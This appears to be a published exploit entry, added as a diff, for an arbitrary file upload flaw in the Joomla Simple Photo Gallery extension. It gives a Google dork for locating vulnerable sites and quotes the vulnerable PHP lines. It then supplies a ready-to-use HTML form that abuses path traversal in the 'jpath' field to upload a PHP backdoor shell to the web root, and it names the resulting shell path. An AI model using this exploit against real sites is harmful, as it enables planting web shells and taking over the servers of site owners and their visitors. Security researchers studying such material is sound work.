@@ -1,0 +1,32 @@
+######################################################################
+# Exploit Title: Joomla Simple Photo Gallery - Arbitrary File Upload
+# Google Dork: inurl:com_simplephotogallery
+# Date: 10.03.2015
+# Exploit Author: CrashBandicot @DosPerl
+# My Github: github.com/CCrashBandicot
+# Vendor Homepage: https://www.apptha.com/
+# Software Link: https://www.apptha.com/category/extension/joomla/simple-photo-gallery
+# Version: 1
+# Tested on: Windows
+######################################################################
+ 
+# Vulnerable File : uploadFile.php
+# Path : /administrator/components/com_simplephotogallery/lib/uploadFile.php
+ 
+20.   $fieldName = 'uploadfile';
+87.      $fileTemp = $_FILES[$fieldName]['tmp_name'];
+94.         $uploadPath = urldecode($_REQUEST["jpath"]).$fileName;
+96.      if(! move_uploaded_file($fileTemp, $uploadPath))
+ 
+ 
+# Exploit :
+ 
+<form method="POST" action="http://localhost/administrator/components/com_simplephotogallery/lib/uploadFile.php" enctype="multipart/form-data" >
+    <input type="file" name="uploadfile"><br>
+    <input type="text" name="jpath" value="..%2F..%2F..%2F..%2F" ><br>
+    <input type="submit" name="Submit" value="Pwn!">
+</form>
+ 
+# Name of Shell Show you after Click on Pwn!, Name is random (eg : backdoor__FDSfezfs.php)
+ 
+# Shell Path : http://localhost/backdoor__[RandomString].php
